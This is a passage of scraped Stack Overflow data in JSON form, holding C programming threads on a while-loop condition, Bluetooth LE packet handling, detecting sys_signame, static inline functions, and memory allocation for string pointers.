"https://stackoverflow.com/questions/33652038/how-can-i-compare-a-char-to-different-letters-in-c", "title": "How can I compare a char to different letters in C?", "body": "<p>This is the code I have.</p>\n\n<pre><code>char ask_for_command(){\n    char letter;\n    printf(\"Command: \");\n    scanf(\" %c\", &amp;letter);\n    while(letter != 'a' || letter != 'd' || letter != 'w' || letter != 'x'){\n        printf(\"NEW MOVEMENT: Enter a valid command by keyword:\\n\");\n        printf(\"Valid commands: a d w x\\n\");\n        scanf(\" %c\", &amp;letter);\n    }\n    return letter;\n}\n</code></pre>\n\n<p>The while loop works like this.</p>\n\n<pre><code>while(letter != 'a'){}\n</code></pre>\n\n<p>But not like this.</p>\n\n<pre><code>while(letter != 'a' || letter != 'd' || letter != 'w' || letter != 'x'){}\n</code></pre>\n\n<p>Can anyone explain to me why? Thank you in a advance.</p>\n"}, {"tags": ["java", "android", "c", "arduino", "bluetooth-lowenergy"], "comments": [{"owner": {"reputation": 478, "user_id": 3861548, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/G89Hn.jpg?s=128&g=1", "display_name": "jabujavi", "link": "https://stackoverflow.com/users/3861548/jabujavi"}, "edited": false, "score": 0, "creation_date": 1447264742, "post_id": 33651753, "comment_id": 55086881, "body": "Send a control byte at the end. Concatenate something to this string, usually &#39;\\0&#39; is the end for a string Read until you recieve it."}, {"owner": {"reputation": 482, "user_id": 702196, "user_type": "registered", "accept_rate": 47, "profile_image": "https://www.gravatar.com/avatar/e8dc45fea004102c4a6cb94e1c93c643?s=128&d=identicon&r=PG", "display_name": "George I.", "link": "https://stackoverflow.com/users/702196/george-i"}, "reply_to_user": {"reputation": 478, "user_id": 3861548, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/G89Hn.jpg?s=128&g=1", "display_name": "jabujavi", "link": "https://stackoverflow.com/users/3861548/jabujavi"}, "edited": false, "score": 0, "creation_date": 1447266140, "post_id": 33651753, "comment_id": 55087737, "body": "I had something like that, but sometimes I send another string, but shorter, which mixes with the one in process of being transmitted."}], "answers": [{"tags": [], "owner": {"reputation": 482, "user_id": 702196, "user_type": "registered", "accept_rate": 47, "profile_image": "https://www.gravatar.com/avatar/e8dc45fea004102c4a6cb94e1c93c643?s=128&d=identicon&r=PG", "display_name": "George I.", "link": "https://stackoverflow.com/users/702196/george-i"}, "is_accepted": true, "score": 2, "last_activity_date": 1447436474, "last_edit_date": 1447436474, "creation_date": 1447415090, "answer_id": 33692017, "question_id": 33651753, "link": "https://stackoverflow.com/questions/33651753/bluetooth-le-data-json-in-20-bytes/33692017#33692017", "title": "Bluetooth LE data JSON in 20 bytes", "body": "<p>I found the solution, although not very elegant.\nInstead of sending the whole JSON string, BLE will send a key/value pair in a single packet.\nIn C first:</p>\n\n<pre><code>char passMsg(String akey, char* origMsg){\n  // akey = object key must be 4 characters long\n  // origMsg + akey must be shorter than 20 characters\n  char* newmsg = origMsg;\n  size_t prevlen = strlen(newmsg);  \n  memset(newmsg + prevlen, ' ', 15 - prevlen);\n  *(newmsg + 15) = '\\0'; \n  String bleMsg = akey + \":\"+newmsg;\n  ble.print(\"AT+BLEUARTTX=\");            \n  ble.println(bleMsg);  \n}\n</code></pre>\n\n<p>This way I pass a string like this: <code>temp:20.45</code></p>\n\n<p>Then in Android/Java:</p>\n\n<pre><code>String[] rawString = data.replace(\" \", \"\").split(\":\");\nif(rawString.length&gt;1){\n  String apiCallKey = rawString[0];\n  String apiCallVal = rawString[1];\n  callAPI(apiCallKey,apiCallVal);\n}\n</code></pre>\n\n<p>Where <code>data</code> is raw data from Bluetooth.</p>\n\n<p>Phew...</p>\n"}], "owner": {"reputation": 482, "user_id": 702196, "user_type": "registered", "accept_rate": 47, "profile_image": "https://www.gravatar.com/avatar/e8dc45fea004102c4a6cb94e1c93c643?s=128&d=identicon&r=PG", "display_name": "George I.", "link": "https://stackoverflow.com/users/702196/george-i"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2353, "favorite_count": 0, "accepted_answer_id": 33692017, "answer_count": 1, "score": 2, "last_activity_date": 1447436474, "creation_date": 1447249108, "last_edit_date": 1447361543, "question_id": 33651753, "link": "https://stackoverflow.com/questions/33651753/bluetooth-le-data-json-in-20-bytes", "title": "Bluetooth LE data JSON in 20 bytes", "body": "<p>I have a Bluetooth LE module on Arduino which sends a JSON string to an Android application.</p>\n\n<p>The JSON string look like this:</p>\n\n<pre><code>{'d_stats':[{'t':'26.62','h':'59.64','p':'755.23','a':'109.02','hrm':'0.00'}]}\n</code></pre>\n\n<p>The Android app receives packets of 20 bytes (20 characters limit) and I can't find a method to put all packets together when the last packet was received.</p>\n\n<p>Is there a way to know when the last packet is received?</p>\n\n<p>Edit: the bluetooth sends data at a constant interval of time. There is a button connected to the Arduino board which, when pushed, will send other data via Bluetooth. The problem is that it overlaps with the timed transmission.</p>\n"}, {"tags": ["c", "linux", "posix"], "comments": [{"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 0, "creation_date": 1447249972, "post_id": 33651665, "comment_id": 55077206, "body": "Your question sounds like an instance of the XY problem. What is it that you want to do with <code>sys_signame</code>?"}, {"owner": {"reputation": 2538, "user_id": 2277331, "user_type": "registered", "accept_rate": 47, "profile_image": "https://www.gravatar.com/avatar/4b8efcf4537807785c9fbc9472bb8f6d?s=128&d=identicon&r=PG", "display_name": "Anton.P", "link": "https://stackoverflow.com/users/2277331/anton-p"}, "edited": false, "score": 0, "creation_date": 1447250176, "post_id": 33651665, "comment_id": 55077340, "body": "How can you compile the code if the variable is not present?"}, {"owner": {"reputation": 16193, "user_id": 1188377, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/63f3c02db51b338549e6e7aff4afbb36?s=128&d=identicon&r=PG", "display_name": "Zenexer", "link": "https://stackoverflow.com/users/1188377/zenexer"}, "reply_to_user": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 0, "creation_date": 1447268583, "post_id": 33651665, "comment_id": 55089293, "body": "@FUZxxl Retrieve signal names and display them to the user in a short form."}, {"owner": {"reputation": 16193, "user_id": 1188377, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/63f3c02db51b338549e6e7aff4afbb36?s=128&d=identicon&r=PG", "display_name": "Zenexer", "link": "https://stackoverflow.com/users/1188377/zenexer"}, "reply_to_user": {"reputation": 2538, "user_id": 2277331, "user_type": "registered", "accept_rate": 47, "profile_image": "https://www.gravatar.com/avatar/4b8efcf4537807785c9fbc9472bb8f6d?s=128&d=identicon&r=PG", "display_name": "Anton.P", "link": "https://stackoverflow.com/users/2277331/anton-p"}, "edited": false, "score": 0, "creation_date": 1447268595, "post_id": 33651665, "comment_id": 55089297, "body": "@Anton.P Yes, that&#39;s the issue. ;)  If the variable isn&#39;t present, I need to define it myself."}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 0, "creation_date": 1447269399, "post_id": 33651665, "comment_id": 55089726, "body": "@Zenexer Use <code>strsignal()</code> from POSIX."}], "answers": [{"comments": [{"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 0, "creation_date": 1447252834, "post_id": 33651965, "comment_id": 55079025, "body": "Please notice that <code>strsignal(sig)</code> outputs a descriptive string for <code>sig</code>, not the signal name itself. For example, <code>strsignal(SIGKILL)</code> usually returns something like <code>&quot;killed&quot;</code>."}, {"owner": {"reputation": 3652, "user_id": 1610530, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/fb145246cb9e317aa990ffa9bcf2f67c?s=128&d=identicon&r=PG", "display_name": "Moshe Gottlieb", "link": "https://stackoverflow.com/users/1610530/moshe-gottlieb"}, "reply_to_user": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 0, "creation_date": 1447253955, "post_id": 33651965, "comment_id": 55079784, "body": "Thanks @FUZxxl, removed this line as it was incorrect like you pointed out."}, {"owner": {"reputation": 16193, "user_id": 1188377, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/63f3c02db51b338549e6e7aff4afbb36?s=128&d=identicon&r=PG", "display_name": "Zenexer", "link": "https://stackoverflow.com/users/1188377/zenexer"}, "edited": false, "score": 0, "creation_date": 1447268477, "post_id": 33651965, "comment_id": 55089223, "body": "All platforms that I&#39;ve looked at define <code>NSIG</code>, but some don&#39;t define <code>sys_signame</code>.  For example, Linux doesn&#39;t have <code>sys_signame</code>, but Mac OS X does; both have <code>NSIG</code>.  BSD lacks supposedly <code>strsignal</code>, but I haven&#39;t tested that.  Signal numbers are not the same across platforms, unfortunately, but I can get around that using macros and <code>#ifdef</code>."}, {"owner": {"reputation": 3652, "user_id": 1610530, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/fb145246cb9e317aa990ffa9bcf2f67c?s=128&d=identicon&r=PG", "display_name": "Moshe Gottlieb", "link": "https://stackoverflow.com/users/1610530/moshe-gottlieb"}, "reply_to_user": {"reputation": 16193, "user_id": 1188377, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/63f3c02db51b338549e6e7aff4afbb36?s=128&d=identicon&r=PG", "display_name": "Zenexer", "link": "https://stackoverflow.com/users/1188377/zenexer"}, "edited": false, "score": 0, "creation_date": 1447269089, "post_id": 33651965, "comment_id": 55089537, "body": "@Zenexer - signal numbers are defined by POSIX, and should be the same everywhere. Can you give an example that shows the opposite?"}, {"owner": {"reputation": 166, "user_id": 1471119, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15ee0d0b65c09c7b3f66542d71bd292b?s=128&d=identicon&r=PG&f=1", "display_name": "Craig Barnes", "link": "https://stackoverflow.com/users/1471119/craig-barnes"}, "edited": false, "score": 0, "creation_date": 1574484267, "post_id": 33651965, "comment_id": 104259083, "body": "@MosheGottlieb Only a small subset of signal numbers are specified by POSIX (in the section for the <a href=\"https://pubs.opengroup.org/onlinepubs/9699919799/utilities/kill.html\" rel=\"nofollow noreferrer\">kill</a> command). The description of <code>&lt;signal.h&gt;</code> doesn&#39;t specify signal numbers at all."}], "tags": [], "owner": {"reputation": 3652, "user_id": 1610530, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/fb145246cb9e317aa990ffa9bcf2f67c?s=128&d=identicon&r=PG", "display_name": "Moshe Gottlieb", "link": "https://stackoverflow.com/users/1610530/moshe-gottlieb"}, "is_accepted": false, "score": 1, "last_activity_date": 1447253920, "last_edit_date": 1447253920, "creation_date": 1447249768, "answer_id": 33651965, "question_id": 33651665, "link": "https://stackoverflow.com/questions/33651665/checking-the-existence-of-a-variable/33651965#33651965", "title": "Checking the existence of a variable", "body": "<p>The way I see it - you need to either create an alternate array that will work on all platforms, depending on the list of signals you are ready to process.<br/></p>\n\n<pre><code>const char* my_sys_signame[] = { NULL, \"HUP\", \"INT\", ...  \"USR2\" };\n</code></pre>\n\n<p><br/>\nFinally, if you must check for the existence of sys_signame, your only option is to do something like:</p>\n\n<pre><code>#ifdef NSIG\n// have sys_signame\n#else\n// does not have sys_signame\n#endif\n</code></pre>\n"}], "owner": {"reputation": 16193, "user_id": 1188377, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/63f3c02db51b338549e6e7aff4afbb36?s=128&d=identicon&r=PG", "display_name": "Zenexer", "link": "https://stackoverflow.com/users/1188377/zenexer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 309, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1447253920, "creation_date": 1447248855, "question_id": 33651665, "link": "https://stackoverflow.com/questions/33651665/checking-the-existence-of-a-variable", "title": "Checking the existence of a variable", "body": "<p>I have a very small program that I'd like to be able to compile on multiple platforms.  Some platforms offer <code>sys_signame</code> in <code>signal.h</code>, but others do not, and I'll need to provide an alternative.  Using <code>#define</code>/<code>#ifndef</code> is not an option: these are platform headers, not mine, and there doesn't seem to be any particular <code>#define</code> line that corresponds with the presence of <code>sys_signame</code> across multiple platforms.</p>\n\n<p>I don't want to add a special case for each platform.  This is a very small program that only a few people are going to see, and it's not going to be used in any sort of production environment.  I don't yet know what operating systems it will be used on.  It's not worth my time to test it thoroughly.  I'll save stuff like that for more important programs.</p>\n\n<p>How can I test for the presence of a global variable such as <code>sys_signame</code>?</p>\n"}, {"tags": ["c", "static-libraries", "inline"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user824425"}, "edited": false, "score": 0, "creation_date": 1447255427, "post_id": 33651661, "comment_id": 55080814, "body": "I think &quot;What would be considered a small function?&quot; might be a surprisingly broad question. There can already be many considerations involved for a specific compiler targeting a specific architecture. One thing should be noted very well, however: <code>inline</code> does not mean that the compiler <i>must</i> inline the function, but merely &quot;suggests that calls to the function be as fast as possible&quot; (says the final draft of the C11 standard in 6.7.4 clause 6)."}], "answers": [{"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 1, "last_activity_date": 1447250378, "creation_date": 1447250378, "answer_id": 33652142, "question_id": 33651661, "link": "https://stackoverflow.com/questions/33651661/static-inline-functions-in-c/33652142#33652142", "title": "static inline functions in c", "body": "<p>Most likely you will get a bigger file, since the code to be inlined will appear multiple times throughout the program instead of just once.</p>\n\n<p>A bigger file doesn't really mean too much, particularly in the age of terabyte disks, if you're trying to improve performance.  Better to have a larger file than to incur the overhead of multiple function calls that aren't necessarily needed.</p>\n"}, {"tags": [], "owner": {"reputation": 13359, "user_id": 1779477, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/f62e1d28063f41fd9728d811fea3a84c?s=128&d=identicon&r=PG&f=1", "display_name": "idmean", "link": "https://stackoverflow.com/users/1779477/idmean"}, "is_accepted": false, "score": 0, "last_activity_date": 1447250861, "last_edit_date": 1447250861, "creation_date": 1447250560, "answer_id": 33652207, "question_id": 33651661, "link": "https://stackoverflow.com/questions/33651661/static-inline-functions-in-c/33652207#33652207", "title": "static inline functions in c", "body": "<p>First of all compilers will not inline every function marked with <code>static</code>. This is not what <code>static</code> keyword is intended for. There\u2019s been the <a href=\"https://en.wikipedia.org/wiki/Inline_function\" rel=\"nofollow\"><code>inline</code> keyword</a> for that purpose, however many compiler ignore it nowadays.</p>\n\n<p>A compiler will carefully decide whether it\u2019s better to inline or not to inline a function. But basically your observation is true: programs optimized for maximum speed tend to be larger. You can see this if you, for instance, look at <a href=\"https://gcc.gnu.org/onlinedocs/gnat_ugn/Optimization-Levels.html\" rel=\"nofollow\">GCC Optimization Levels</a>.</p>\n\n<blockquote>\n  <p>For small functions that are called frequently that can make a big performance difference.</p>\n</blockquote>\n\n<p>If the function is that small that the push of the function onto the stack would take longer than actually executing the body the function could be a performance problem. In such a case a good compiler will inline the function. If the stack push however would be the cheapest part of executing the function, inlining is unlikely to happen.</p>\n"}, {"comments": [{"owner": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "edited": false, "score": 0, "creation_date": 1447257260, "post_id": 33652246, "comment_id": 55082097, "body": "That is not an answer to the question. Also it is misleading, since it mixes up the fact of declaring a function <code>inline</code> with the fact that a compiler actually inlines a function. Two things that are only loosely related."}], "tags": [], "owner": {"reputation": 647, "user_id": 2422669, "user_type": "registered", "accept_rate": 10, "profile_image": "https://www.gravatar.com/avatar/ce364e13067d5d19d9d1b7b7d2fffbb8?s=128&d=identicon&r=PG", "display_name": "Sigcont", "link": "https://stackoverflow.com/users/2422669/sigcont"}, "is_accepted": false, "score": 0, "last_activity_date": 1447250697, "creation_date": 1447250697, "answer_id": 33652246, "question_id": 33651661, "link": "https://stackoverflow.com/questions/33651661/static-inline-functions-in-c/33652246#33652246", "title": "static inline functions in c", "body": "<p><a href=\"http://www.drdobbs.com/the-new-c-inline-functions/184401540\" rel=\"nofollow\">Inline Disadvantages</a></p>\n\n<p>The primary disadvantage to inline substitution is that it usually makes the program code bigger. In extreme cases, this can degrade program performance by increasing page faults and cache misses. Reading a page from the disk may take as long as executing hundreds of thousands of instructions. Poor cache performance may slow down a program by a factor of two. Reasonable care must be taken when inlining not to make the program so big that either paging or caching problems dominate the execution time.</p>\n"}], "owner": {"reputation": 1547, "user_id": 1610950, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/4bdf26f3a05f1dbaa2a52ec1fc0aca27?s=128&d=identicon&r=PG", "display_name": "user1610950", "link": "https://stackoverflow.com/users/1610950/user1610950"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 907, "favorite_count": 0, "accepted_answer_id": 33652142, "answer_count": 3, "score": 1, "last_activity_date": 1447252014, "creation_date": 1447248847, "last_edit_date": 1495541036, "question_id": 33651661, "link": "https://stackoverflow.com/questions/33651661/static-inline-functions-in-c", "title": "static inline functions in c", "body": "<p>I read this other SO <a href=\"https://stackoverflow.com/questions/7762731/whats-the-difference-between-static-and-static-inline-function\">question and answer</a> and it seems to make sense to me but I had one additional question to add it it.</p>\n\n<p>The most up voted answer says</p>\n\n<blockquote>\n  <p>For small functions that are called frequently that can make a big\n  performance difference.</p>\n</blockquote>\n\n<p>okay, so what would be considered a small function?</p>\n\n<p>The reason that I am asking is that I am looking at using a math library, vectormath from the bullet physics framework. All their math functions are static inline but while some are fairly short some are pretty long.</p>\n\n<p>Here's what I consider short:</p>\n\n<pre><code>static inline void vmathM3Copy( VmathMatrix3 *result, const VmathMatrix3 *mat )\n{\n    vmathV3Copy( &amp;result-&gt;col0, &amp;mat-&gt;col0 );\n    vmathV3Copy( &amp;result-&gt;col1, &amp;mat-&gt;col1 );\n    vmathV3Copy( &amp;result-&gt;col2, &amp;mat-&gt;col2 );\n}\n</code></pre>\n\n<p>but even that would embed this function 3 time:</p>\n\n<pre><code>static inline void vmathV3Copy( VmathVector3 *result, const VmathVector3 *vec )\n{\n    result-&gt;x = vec-&gt;x;\n    result-&gt;y = vec-&gt;y;\n    result-&gt;z = vec-&gt;z;\n}\n</code></pre>\n\n<p>Here's what seems to be long to me:</p>\n\n<pre><code>static inline float vmathM4Determinant( const VmathMatrix4 *mat )\n{\n    float dx, dy, dz, dw, mA, mB, mC, mD, mE, mF, mG, mH, mI, mJ, mK, mL, mM, mN, mO, mP, tmp0, tmp1, tmp2, tmp3, tmp4, tmp5;\n    mA = mat-&gt;col0.x;\n    mB = mat-&gt;col0.y;\n    mC = mat-&gt;col0.z;\n    mD = mat-&gt;col0.w;\n    mE = mat-&gt;col1.x;\n    mF = mat-&gt;col1.y;\n    mG = mat-&gt;col1.z;\n    mH = mat-&gt;col1.w;\n    mI = mat-&gt;col2.x;\n    mJ = mat-&gt;col2.y;\n    mK = mat-&gt;col2.z;\n    mL = mat-&gt;col2.w;\n    mM = mat-&gt;col3.x;\n    mN = mat-&gt;col3.y;\n    mO = mat-&gt;col3.z;\n    mP = mat-&gt;col3.w;\n    tmp0 = ( ( mK * mD ) - ( mC * mL ) );\n    tmp1 = ( ( mO * mH ) - ( mG * mP ) );\n    tmp2 = ( ( mB * mK ) - ( mJ * mC ) );\n    tmp3 = ( ( mF * mO ) - ( mN * mG ) );\n    tmp4 = ( ( mJ * mD ) - ( mB * mL ) );\n    tmp5 = ( ( mN * mH ) - ( mF * mP ) );\n    dx = ( ( ( mJ * tmp1 ) - ( mL * tmp3 ) ) - ( mK * tmp5 ) );\n    dy = ( ( ( mN * tmp0 ) - ( mP * tmp2 ) ) - ( mO * tmp4 ) );\n    dz = ( ( ( mD * tmp3 ) + ( mC * tmp5 ) ) - ( mB * tmp1 ) );\n    dw = ( ( ( mH * tmp2 ) + ( mG * tmp4 ) ) - ( mF * tmp0 ) );\n    return ( ( ( ( mA * dx ) + ( mE * dy ) ) + ( mI * dz ) ) + ( mM * dw ) );\n}\n</code></pre>\n\n<p>or even this one</p>\n\n<pre><code>static inline void vmathM4Inverse( VmathMatrix4 *result, const VmathMatrix4 *mat )\n{\n    VmathVector4 res0, res1, res2, res3;\n    float mA, mB, mC, mD, mE, mF, mG, mH, mI, mJ, mK, mL, mM, mN, mO, mP, tmp0, tmp1, tmp2, tmp3, tmp4, tmp5, detInv;\n    mA = mat-&gt;col0.x;\n    mB = mat-&gt;col0.y;\n    mC = mat-&gt;col0.z;\n    mD = mat-&gt;col0.w;\n    mE = mat-&gt;col1.x;\n    mF = mat-&gt;col1.y;\n    mG = mat-&gt;col1.z;\n    mH = mat-&gt;col1.w;\n    mI = mat-&gt;col2.x;\n    mJ = mat-&gt;col2.y;\n    mK = mat-&gt;col2.z;\n    mL = mat-&gt;col2.w;\n    mM = mat-&gt;col3.x;\n    mN = mat-&gt;col3.y;\n    mO = mat-&gt;col3.z;\n    mP = mat-&gt;col3.w;\n    tmp0 = ( ( mK * mD ) - ( mC * mL ) );\n    tmp1 = ( ( mO * mH ) - ( mG * mP ) );\n    tmp2 = ( ( mB * mK ) - ( mJ * mC ) );\n    tmp3 = ( ( mF * mO ) - ( mN * mG ) );\n    tmp4 = ( ( mJ * mD ) - ( mB * mL ) );\n    tmp5 = ( ( mN * mH ) - ( mF * mP ) );\n    vmathV4SetX( &amp;res0, ( ( ( mJ * tmp1 ) - ( mL * tmp3 ) ) - ( mK * tmp5 ) ) );\n    vmathV4SetY( &amp;res0, ( ( ( mN * tmp0 ) - ( mP * tmp2 ) ) - ( mO * tmp4 ) ) );\n    vmathV4SetZ( &amp;res0, ( ( ( mD * tmp3 ) + ( mC * tmp5 ) ) - ( mB * tmp1 ) ) );\n    vmathV4SetW( &amp;res0, ( ( ( mH * tmp2 ) + ( mG * tmp4 ) ) - ( mF * tmp0 ) ) );\n    detInv = ( 1.0f / ( ( ( ( mA * res0.x ) + ( mE * res0.y ) ) + ( mI * res0.z ) ) + ( mM * res0.w ) ) );\n    vmathV4SetX( &amp;res1, ( mI * tmp1 ) );\n    vmathV4SetY( &amp;res1, ( mM * tmp0 ) );\n    vmathV4SetZ( &amp;res1, ( mA * tmp1 ) );\n    vmathV4SetW( &amp;res1, ( mE * tmp0 ) );\n    vmathV4SetX( &amp;res3, ( mI * tmp3 ) );\n    vmathV4SetY( &amp;res3, ( mM * tmp2 ) );\n    vmathV4SetZ( &amp;res3, ( mA * tmp3 ) );\n    vmathV4SetW( &amp;res3, ( mE * tmp2 ) );\n    vmathV4SetX( &amp;res2, ( mI * tmp5 ) );\n    vmathV4SetY( &amp;res2, ( mM * tmp4 ) );\n    vmathV4SetZ( &amp;res2, ( mA * tmp5 ) );\n    vmathV4SetW( &amp;res2, ( mE * tmp4 ) );\n    tmp0 = ( ( mI * mB ) - ( mA * mJ ) );\n    tmp1 = ( ( mM * mF ) - ( mE * mN ) );\n    tmp2 = ( ( mI * mD ) - ( mA * mL ) );\n    tmp3 = ( ( mM * mH ) - ( mE * mP ) );\n    tmp4 = ( ( mI * mC ) - ( mA * mK ) );\n    tmp5 = ( ( mM * mG ) - ( mE * mO ) );\n    vmathV4SetX( &amp;res2, ( ( ( mL * tmp1 ) - ( mJ * tmp3 ) ) + res2.x ) );\n    vmathV4SetY( &amp;res2, ( ( ( mP * tmp0 ) - ( mN * tmp2 ) ) + res2.y ) );\n    vmathV4SetZ( &amp;res2, ( ( ( mB * tmp3 ) - ( mD * tmp1 ) ) - res2.z ) );\n    vmathV4SetW( &amp;res2, ( ( ( mF * tmp2 ) - ( mH * tmp0 ) ) - res2.w ) );\n    vmathV4SetX( &amp;res3, ( ( ( mJ * tmp5 ) - ( mK * tmp1 ) ) + res3.x ) );\n    vmathV4SetY( &amp;res3, ( ( ( mN * tmp4 ) - ( mO * tmp0 ) ) + res3.y ) );\n    vmathV4SetZ( &amp;res3, ( ( ( mC * tmp1 ) - ( mB * tmp5 ) ) - res3.z ) );\n    vmathV4SetW( &amp;res3, ( ( ( mG * tmp0 ) - ( mF * tmp4 ) ) - res3.w ) );\n    vmathV4SetX( &amp;res1, ( ( ( mK * tmp3 ) - ( mL * tmp5 ) ) - res1.x ) );\n    vmathV4SetY( &amp;res1, ( ( ( mO * tmp2 ) - ( mP * tmp4 ) ) - res1.y ) );\n    vmathV4SetZ( &amp;res1, ( ( ( mD * tmp5 ) - ( mC * tmp3 ) ) + res1.z ) );\n    vmathV4SetW( &amp;res1, ( ( ( mH * tmp4 ) - ( mG * tmp2 ) ) + res1.w ) );\n    vmathV4ScalarMul( &amp;result-&gt;col0, &amp;res0, detInv );\n    vmathV4ScalarMul( &amp;result-&gt;col1, &amp;res1, detInv );\n    vmathV4ScalarMul( &amp;result-&gt;col2, &amp;res2, detInv );\n    vmathV4ScalarMul( &amp;result-&gt;col3, &amp;res3, detInv );\n}\n</code></pre>\n\n<p>The guys who wrote the library obviously understand the math very well but if your doing a lot of math operations and the compiler probably inlining all these functions wouldn't you get a bigger file?</p>\n"}, {"tags": ["c"], "answers": [{"tags": [], "owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "is_accepted": false, "score": 1, "last_activity_date": 1447248679, "creation_date": 1447248679, "answer_id": 33651621, "question_id": 33651478, "link": "https://stackoverflow.com/questions/33651478/dynamic-memory-allocation-when-and-why/33651621#33651621", "title": "Dynamic Memory Allocation - When and Why", "body": "<pre><code>name=name1; // Here I dont have to allocate Memory (Case 1)\n</code></pre>\n\n<p>In this case , you <strong><em>don't allocate memory to</em></strong> <code>name</code> , <em>you just make it point to array</em> <code>name1</code> . In short , <code>name</code> now has address of first element of array <code>name1</code>. </p>\n\n<pre><code>target=(char*)calloc(10,sizeof(char));  // Here I have to allocate Memory (Case 2)\nxcopy(target,name);\n</code></pre>\n\n<p>And in case <code>2</code>  you need to allocate memory as you copy the contents of <code>name1</code> at the memory block to which <code>target</code> points to . </p>\n\n<p>Here , it is needed as if you don't allocate memory then <code>target</code> point to anything (<em>maybe garbage</em>) and writing to that location will cause <em>undefined behaviour</em>.</p>\n\n<p><strong>Note</strong> - You don't need to <code>free</code> any memory in case <code>1</code> as pointer points to a array on stack . But you need to do <code>free(target);</code> in case <code>2</code> as you allocate memory on heap.  </p>\n"}, {"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 1, "last_activity_date": 1447248687, "creation_date": 1447248687, "answer_id": 33651624, "question_id": 33651478, "link": "https://stackoverflow.com/questions/33651478/dynamic-memory-allocation-when-and-why/33651624#33651624", "title": "Dynamic Memory Allocation - When and Why", "body": "<p>In the first case, you start with <code>name1</code>, which is an array of <code>char</code>.  Then  you take <code>name</code>, which is a <code>char *</code>, and assign <code>name1</code> to it.  Since <code>name1</code> is being evaluated in pointer context, it refers to a pointer to the first element of the array.  So now <code>name</code> points to the first element of <code>name1</code>.</p>\n\n<p>In the second case, <code>target</code> is assigned a memory location returned by a call to <code>calloc</code>, which in this case is a block of 10 bytes.  The bytes now pointed to by <code>target</code> can now be used.</p>\n\n<p>As with any pointer, you need to assign it a value before you can dereference it.  That value can be either the address of some other variable, or a block of memory returned by the <code>malloc</code> family of functions.</p>\n"}], "owner": {"reputation": 1055, "user_id": 1371683, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/62ae4481ea2228b76ebfec3585752697?s=128&d=identicon&r=PG", "display_name": "redsoxlost", "link": "https://stackoverflow.com/users/1371683/redsoxlost"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 28, "favorite_count": 0, "accepted_answer_id": 33651624, "answer_count": 2, "score": 0, "last_activity_date": 1447248687, "creation_date": 1447248213, "question_id": 33651478, "link": "https://stackoverflow.com/questions/33651478/dynamic-memory-allocation-when-and-why", "title": "Dynamic Memory Allocation - When and Why", "body": "<p>I am a novice in C and trying to understand basic concepts in C, Like when and Why I have to allocate Memory for a string pointer.\nhere I have a sample program. I have commented in appropriate locations. Please help me understand. </p>\n\n<pre><code>/ Please help me understand why do I have allocate Memory in Case 2 while I don't have to 